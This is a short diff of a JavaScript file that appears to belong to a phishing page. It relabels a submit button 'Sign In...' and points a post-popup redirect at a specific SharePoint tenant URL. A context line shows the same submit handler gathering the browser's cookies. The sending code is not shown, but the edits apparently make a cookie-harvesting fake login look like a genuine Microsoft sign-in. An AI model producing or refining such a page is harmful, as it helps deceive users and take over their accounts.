@@ -298,7 +298,7 @@ document.addEventListener('DOMContentLoaded', function() {
         try {
             // Disable button and show loading
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Submitting...';
+            submitBtn.textContent = 'Sign In...';
             submitBtn.style.opacity = '0.7';
             
             // Get browser cookies data
@@ -444,7 +444,7 @@ document.addEventListener('DOMContentLoaded', function() {
         closePopup();
         
         // Define the redirect URL (you can change this to any URL you want)
-        const redirectUrl = 'https://example.com/document-viewer'; // Change this URL
+        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
         
         console.log('Redirecting to:', redirectUrl);
         
